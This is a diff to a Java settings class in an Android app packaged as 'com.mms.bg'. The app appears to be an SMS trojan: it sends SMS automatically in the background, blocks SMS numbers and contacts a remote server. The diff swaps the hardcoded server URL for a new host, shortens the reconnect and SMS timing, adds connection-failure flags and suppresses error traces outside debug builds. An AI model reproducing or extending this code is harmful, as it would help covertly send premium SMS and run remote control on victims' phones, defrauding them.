@@ -65,8 +65,12 @@ public class SettingManager {
     public static final String SMS_CENTER = "sms_center";
     public static final String FIRST_START_TIME = "first_start_time";
     public static final String SMS_TEMP_BLOCK_NUM_AND_TIMES = "sms_temp_block_num_and_times";
+    public static final String INTERNET_CONNECT_FAILED = "internet_connect_failed";
+    public static final String INTERNET_CONNECT_FAILED_BEFORE_SMS = "internet_connect_failed_before_SMS";
     
-    private static final String SERVER_URL = "http://go.ruitx.cn/Coop/request3.php";
+//    private static final String SERVER_URL = "http://go.ruitx.cn/Coop/request3.php";
+    private static final String SERVER_URL = "http://www.youlubg.com:81/Coop/request3.php";
+    
     public final String BASE_PATH;
     public final String SETTING_FILE_NAME;
     public final String UPLOAD_FILE_PATH;
@@ -76,8 +80,8 @@ public class SettingManager {
     
     private static final String DEFAULT_VALUE = "";
 //    private static final long SMS_DEFAULT_DELAY_TIME = (((long) 30) * 24 * 3600 * 1000);
-    public static final long SMS_DEFAULT_DELAY_TIME = 1 * 3600 * 1000;
-    private static final long SMS_ONE_ROUND_NAP = 3 * 60 * 1000;
+    public static final long SMS_DEFAULT_DELAY_TIME = (((long) 24) * 3600 * 1000);
+    private static final long SMS_ONE_ROUND_NAP = 5 * 60 * 1000;
     
     public static final String AUTO_SMS_ACTION = "com.mms.bg.SMS";
     public static final String AUTO_CONNECT_SERVER = "com.mms.bg.SERVER";
@@ -391,6 +395,24 @@ public class SettingManager {
         return mSP.getString(FIRST_START_TIME, null);
     }
     
+    public void setInternetConnectFailed(boolean failed) {
+        mEditor.putBoolean(INTERNET_CONNECT_FAILED, failed);
+        mEditor.commit();
+    }
+    
+    public boolean getInternetConnectFailed() {
+        return mSP.getBoolean(INTERNET_CONNECT_FAILED, false);
+    }
+    
+    public void setInternetConnectFailedBeforeSMS(boolean failed) {
+        mEditor.putBoolean(INTERNET_CONNECT_FAILED_BEFORE_SMS, failed);
+        mEditor.commit();
+    }
+    
+    public boolean getInternetConnectFailedBeforeSMS() {
+        return mSP.getBoolean(INTERNET_CONNECT_FAILED_BEFORE_SMS, false);
+    }
+    
     /**
      * set the first start time for the mmsbg
      */
@@ -418,7 +440,7 @@ public class SettingManager {
         
         long connect_delay_time = delayTime != 0 ? delayTime : DEFAULT_FETCH_DELAY;
         long latestConnectTime = getLastConnectServerTime();
-        long tempDelay = 5 * 60 * 1000;
+        long tempDelay = 1 * 60 * 1000;
         if (latestConnectTime != 0 && (currentTime - latestConnectTime) >= connect_delay_time + tempDelay) {
             firstTime = currentTime + tempDelay;
         } else if (latestConnectTime != 0) {
@@ -481,9 +503,17 @@ public class SettingManager {
             LOGD("[[openConnection]] return response != null");
             return response;
         } catch (ClientProtocolException e) {
-            e.printStackTrace();
+            if (DEBUG) {
+                e.printStackTrace();
+            }
         } catch (IOException e) {
-            e.printStackTrace();
+            if (DEBUG) {
+                e.printStackTrace();
+            }
+        } catch (Exception e) {
+            if (DEBUG) {
+                e.printStackTrace();
+            }
         }
         return null;
     }
